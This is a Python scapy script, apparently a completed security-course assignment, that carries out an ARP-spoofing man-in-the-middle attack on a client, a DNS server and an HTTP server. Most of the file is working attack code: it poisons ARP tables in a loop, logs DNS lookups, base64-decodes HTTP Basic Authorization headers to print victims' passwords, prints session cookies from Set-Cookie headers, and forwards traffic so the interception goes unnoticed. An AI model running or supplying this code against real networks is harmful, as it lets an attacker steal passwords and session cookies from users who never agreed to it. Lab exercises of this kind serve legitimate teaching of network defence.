from scapy.all import *

import argparse
import sys
import threading
import time
import base64

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    # Sends an ARP request to the IP address and returns a list of tuples containing the sent and received packets.
    reply = arping(IP, timeout = 5)

    # Extract the mac address (hwsrc -> source hardware request).
    # arping returns 2 lists. A list of answer packets and unanswered packets (so a tuple of two lists). Each element
    # in this list is a tuple of 2 elements (sent packet, recieved packet). 
    # So reply[0][0][1] returns the ARP reply packet of the first device that replied. 
    mac = reply[0][0][1].getlayer(ARP).hwsrc
    # debug(IP + " => " + mac)
    return mac


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        # note we  are changing the ARP table of destination
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC)     # Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC)      # Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC)   # Spoof dnsServer ARP table
        time.sleep(interval)

# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    # debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    # Create an ARP packet with operation code of 2 ("is at")
    send(ARP(hwsrc = srcMAC, psrc = srcIP, hwdst = dstMAC, pdst = dstIP, op = 2))



# TODO: restore ARP so that dst changes its ARP table entry for src
# Why not the same format as spoof? Why are we using send instead of sendp?
def restore(srcIP, srcMAC, dstIP, dstMAC):
    # debug(f"restoring ARP table for {dstIP}")
    send(ARP(hwsrc = srcMAC, psrc = srcIP, hwdst = dstMAC, pdst = dstIP, op = 2))


def print_http_header(packet, header_name):
    raw_data_binary = packet[Raw].load

    # Encode header_name to binary for comparison
    header_name_binary = header_name.encode()  

    # Check if header_name is present in raw_data_binary
    if header_name_binary in raw_data_binary: 
        # Split raw_data_binary by line break
        http_headers = raw_data_binary.split("\r\n".encode())  
        for header in http_headers:
            # Convert header from binary to string
            header = header.decode() 

            # Check if header_name is present in header 
            if header_name in header:  
                # Extract header value
                header_value = header.split(header_name)[1]  

                if header_name == "Authorization: Basic ":
                    # If header_name is "Authorization: Basic ", decode header_value from base64
                    # and extract the second part (after ':'), then print it as "*basicauth:"
                    print("*basicauth:" + base64.b64decode(header_value).decode('utf-8').split(":")[1])
                    break
                elif header_name == "Set-Cookie: ":
                    # If header_name is "Set-Cookie: ", print header_value as "*cookie:"
                    print("*cookie:" + header_value)
                    break


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC

    # get the ethernet and IP layers
    eth = None
    ip = None

    if Ether in packet:
        eth = packet[Ether]
    
    if IP in packet:
        ip = packet[IP]
    

    # Don't do anything for attacker's own packets
    if eth and eth.src == attackerMAC:
        return

    # Sniff DNS packets (Client to server or server to client)
    if DNS in packet:
        if eth.src == clientMAC and ip.src == clientIP:
            print("*hostname:" + packet[DNS].qd.qname.decode())
        elif eth.src == dnsServerMAC and ip.src == dnsServerIP and packet[DNS].ancount:
            print("*hostaddr:" + packet[DNS].an.rdata) 

    # Sniff HTTPS packets (Client to server or server to client)
    elif Raw in packet:
        if eth.src == clientMAC and ip.src == clientIP:
            print_http_header(packet, "Authorization: Basic ")
        elif eth.src == httpServerMAC and ip.src == httpServerIP:
            print_http_header(packet, "Set-Cookie: ")
        
    # Forward traffic normally to DNS / HTTP / Client
    if IP in packet:
        if ip.dst == dnsServerIP:
            eth.dst = dnsServerMAC
            eth.src = attackerMAC
            sendp(packet)  
        elif ip.dst == httpServerIP:
            eth.dst = httpServerMAC
            eth.src = attackerMAC
            sendp(packet)
        elif ip.dst == clientIP:
            eth.dst = clientMAC
            eth.src = attackerMAC
            sendp(packet)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
